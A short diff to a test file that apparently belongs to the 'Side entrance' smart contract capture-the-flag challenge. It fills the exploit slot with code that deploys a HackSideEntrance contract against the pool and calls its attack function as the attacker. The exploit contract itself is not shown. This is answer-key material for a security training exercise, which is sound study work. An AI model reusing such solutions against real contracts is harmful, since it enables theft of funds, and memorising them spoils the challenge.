@@ -26,6 +26,11 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const hack = await HackSideEntrance.new(this.pool.address, {
+            from: deployer,
+          });
+      
+          await hack.attack({ from: attacker });
     });
 
     after(async function () {
